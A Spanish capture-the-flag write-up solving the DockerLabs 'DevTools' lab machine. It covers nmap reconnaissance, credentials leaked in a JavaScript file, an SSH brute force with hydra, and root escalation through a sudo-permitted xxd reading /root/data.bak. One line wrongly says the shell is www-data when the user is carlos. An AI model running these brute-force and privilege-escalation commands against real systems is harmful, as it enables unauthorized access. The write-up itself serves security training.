#MAQUINA #DOCKERLABS #MEDIO 

<hr>

# RECONOCIMIENTO

Vamos a resolver **DevTools** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 15:38 CET
Initiating ARP Ping Scan at 15:38
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:38, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:38
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:38, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-17 15:38:16 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 15:39 CET
Nmap scan report for 172.17.0.2
Host is up (0.000016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 4d:ea:92:ba:53:e3:b8:dc:71:95:50:19:87:6b:b2:6d (ECDSA)
|_  256 fa:77:68:76:dc:8e:b1:cd:56:5f:c1:79:89:ad:fa:78 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: \xC2\xBFQu\xC3\xA9 son las DevTools del Navegador?
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds


```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 15:39 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Al entrar nos pide autenticarnos, como no logro loggearme, voy a inspeccionar el código:

```shell
curl -s -X GET "http://172.17.0.2/"                                                            
<!DOCTYPE html>
<html lang="es">
<head>
    <script src="backupp.js" defer></script>


```

Vemos un archivo, y al meternos :
```bash
const usuario = "chocolate";
const contrasena = "chocolate"; // Antigua contraseÃ±a baluleroh

const solicitarAutenticacion = () => {
    const credenciales = prompt("Ingrese las credenciales en el formato usuario:contraseÃ±a:");

    if (credenciales) {
        const [entradaUsuario, entradaContrasena] = credenciales.split(":");

        if (entradaUsuario === usuario && entradaContrasena === contrasena) {
            alert("AutenticaciÃ³n exitosa. Â¡Bienvenido!");
        } else {
            alert("AutenticaciÃ³n fallida. IntÃ©ntelo de nuevo.");
            solicitarAutenticacion(); // Reintentar autenticaciÃ³n
        }
    } else {
        alert("Debe ingresar las credenciales.");
        solicitarAutenticacion();
    }
};

solicitarAutenticacion();
```

**chocolate:chocolate**

Nos dice que la antigua contra era **baluleroh**.

# EXPLOTACION

Usamos **hydra**:

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p baluleroh ssh://172.17.0.2 -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-17 15:58:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 8295455 login tries (l:8295455/p:1), ~129617 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlos   password: baluleroh
```

YA ESTAMOS COMO WWW-DATA.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
carlos@2fab6fa37d5c:~$ sudo -l
Matching Defaults entries for carlos on 2fab6fa37d5c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User carlos may run the following commands on 2fab6fa37d5c:
    (ALL) NOPASSWD: /usr/bin/ping
    (ALL) NOPASSWD: /usr/bin/xxd


```

Vemos **xxd** con permisos SUDO  :

   ```bash
carlos@2fab6fa37d5c:~$ ls
nota.txt
carlos@2fab6fa37d5c:~$ sudo xxd nota.txt | xxd -r
Backup en data.bak dentro del directorio de root
carlos@2fab6fa37d5c:~$ sudo xxd /root/data.bak | xxd -r
root:balulerito
carlos@2fab6fa37d5c:~$ su root
Password: 
root@2fab6fa37d5c:/home/carlos# whoami
root
root@2fab6fa37d5c:/home/carlos# 

```

**YA ESTAMOS COMO ROOT.**